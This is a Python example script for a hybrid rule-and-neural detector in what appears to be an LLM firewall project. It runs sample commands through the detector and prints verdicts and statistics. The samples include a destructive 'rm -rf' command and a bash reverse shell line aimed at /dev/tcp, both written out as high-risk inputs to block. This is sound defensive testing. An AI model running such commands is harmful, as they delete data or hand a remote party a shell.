"""
Dynamic Hybrid Detector Beispiel
================================

Demonstriert intelligente Orchestrierung.

Creator: HAK_GAL (Joerg Bollwahn)
Date: 2025-12-08
License: MIT
"""

import sys
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root / "src"))

import torch
from llm_firewall.ml import DynamicHybridDetector, RuleEngine, QuantumInspiredCNN


def example_dynamic_hybrid():
    """Beispiel: Dynamic Hybrid Detector."""
    print("=" * 80)
    print("DYNAMIC HYBRID DETECTOR BEISPIEL")
    print("=" * 80)
    
    # Setup
    neural_model = QuantumInspiredCNN(
        vocab_size=1000,
        embedding_dim=64,
        num_classes=2
    )
    rule_engine = RuleEngine()
    
    hybrid = DynamicHybridDetector(
        neural_model=neural_model,
        rule_engine=rule_engine,
        high_confidence_threshold=0.9,
        low_risk_threshold=0.1
    )
    
    # Test Cases
    test_cases = [
        ("rm -rf /tmp", "High risk - sollte fast block sein"),
        ("echo 'Hello World'", "Low risk - sollte fast allow sein"),
        ("SELECT * FROM users WHERE id = ?", "Uncertain - sollte ML konsultieren"),
        ("bash -i >& /dev/tcp/192.168.1.1/8080", "High risk - sollte fast block sein"),
    ]
    
    print("\nTest Cases:")
    print("-" * 80)
    
    for text, description in test_cases:
        # Simple tokenization
        token_ids = [ord(c) % 1000 for c in text[:128]]
        while len(token_ids) < 128:
            token_ids.append(0)
        input_ids = torch.tensor([token_ids], dtype=torch.long)
        
        result = hybrid.detect(text, input_ids=input_ids)
        
        print(f"\nText: {text}")
        print(f"  Description: {description}")
        print(f"  Verdict: {result['verdict'].upper()}")
        print(f"  Method: {result['method']}")
        print(f"  Risk Score: {result['risk_score']:.3f}")
        print(f"  Confidence: {result['confidence']:.3f}")
        print(f"  Latency: {result['latency_ms']:.2f}ms")
        print(f"  Neural Used: {result.get('neural_used', False)}")
        if result.get('matched_patterns'):
            print(f"  Patterns: {', '.join(result['matched_patterns'][:3])}")
    
    # Statistics
    stats = hybrid.get_statistics()
    print(f"\n{'='*80}")
    print("STATISTICS")
    print(f"{'='*80}")
    print(f"Total Requests: {stats['total_requests']}")
    print(f"Fast Block: {stats['fast_block']} ({stats['fast_block']/stats['total_requests']*100:.1f}%)")
    print(f"Fast Allow: {stats['fast_allow']} ({stats['fast_allow']/stats['total_requests']*100:.1f}%)")
    print(f"ML Consulted: {stats['ml_consulted']} ({stats['ml_usage_rate']*100:.1f}%)")
    print(f"Fast Decision Rate: {stats['fast_decision_rate']*100:.1f}%")
    print(f"{'='*80}\n")


if __name__ == "__main__":
    example_dynamic_hybrid()
